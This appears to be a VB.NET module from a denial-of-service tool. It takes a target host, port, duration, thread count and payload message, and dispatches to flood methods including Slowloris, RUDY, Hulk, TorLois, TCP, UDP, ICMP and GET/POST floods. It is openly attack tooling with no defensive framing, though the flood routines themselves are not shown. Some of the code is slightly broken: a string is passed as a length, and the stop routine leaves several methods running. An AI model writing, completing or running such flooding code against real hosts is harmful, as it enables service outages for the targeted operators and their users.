Public Module attack
    Private host As String
    Private port As Integer
    Private time As Integer
    Private thread As Integer
    Private funnymessage As String
    Public Sub startattack(ByVal hostt, ByVal portt, ByVal timee, ByVal threadd, ByVal funnymessage, ByVal method)
        If Mainmenu.length_chchbox.Checked Then
            Dim randomstring As String = GenerateRandomString(funnymessage, False)
            selectcase(method, hostt, portt, threadd, timee, randomstring, randomstring.Length - 1)
        Else
            selectcase(method, hostt, portt, threadd, timee, funnymessage, funnymessage.length - 1)
        End If
    End Sub
    Public Function getHost()
        Return host
    End Function
    Public Function getPort()
        Return port
    End Function
    Public Function getTime()
        Return time
    End Function
    Public Function getthread()
        Return thread
    End Function
    Public Function getFunnymessage()
        Return funnymessage
    End Function
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub selectcase(ByVal method, ByVal host, ByVal port, ByVal Threadsto, ByVal Time, ByVal data, ByVal length)
        Try
            Select Case method
                Case "A.R.M.E"
                    StartARME(host, port, Threadsto, Time, data)
                Case "Slowloris"
                    StartSlowloris(host, port, Threadsto, Time, data)
                Case "TCP"
                    StartCondis(host, Time, Threadsto, port, length, method)
                Case "UDP"
                    StartCondis(host, Time, Threadsto, port, length, method)
                Case "GET Flood"
                    StartBandwidthFlood(host, Threadsto, port, method, data)
                Case "POST Flood"
                    StartBandwidthFlood(host, Threadsto, port, method, data)
                Case "RUDY"
                    StartRudy(host, port, Threadsto, Time, data)
                Case "Hulk"
                    StartHulk(host, port, Threadsto, Time, data)
                Case "TorLois"
                    Starttorloris(host, port, Threadsto, Time, data)
                Case "ICMP"
                    Starticmp(host, Threadsto, Time)
            End Select

        Catch ex As Exception
            Console.Write("Switch fail")
            MsgBox("Switch fail")
        End Try
    End Sub
    Public Sub stopflood()
        StopBandwidthFlood()
        StopCondis()
        StopSlowloris()
        StopARME()
        StopRudy()
    End Sub
End Module
